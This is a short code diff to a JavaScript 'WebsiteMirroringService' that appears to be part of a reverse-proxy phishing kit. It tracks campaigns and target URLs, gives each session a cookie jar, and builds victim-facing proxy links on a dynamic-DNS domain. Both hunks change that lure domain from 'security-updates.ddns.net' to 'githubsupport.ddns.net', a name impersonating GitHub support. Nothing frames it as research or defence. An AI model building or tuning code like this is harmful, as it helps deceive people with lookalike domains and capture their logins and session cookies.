@@ -1708,7 +1708,7 @@ class WebsiteMirroringService {
             campaignId: dbSession.campaign_id,
             targetUrl: dbSession.target_url,
             sessionToken,
-            proxyUrl: `https://security-updates.ddns.net/${sessionToken}`,
+            proxyUrl: `https://githubsupport.ddns.net/${sessionToken}`,
             startTime: new Date(dbSession.created_at)
           };
           
@@ -1879,7 +1879,7 @@ class WebsiteMirroringService {
       });
 
       // Create proxy URL using path-based routing on the new domain
-      const proxyUrl = `https://security-updates.ddns.net/${sessionToken}`;
+      const proxyUrl = `https://githubsupport.ddns.net/${sessionToken}`;
       
       // Create cookie jar for this session
       const cookieJar = new CookieJar();
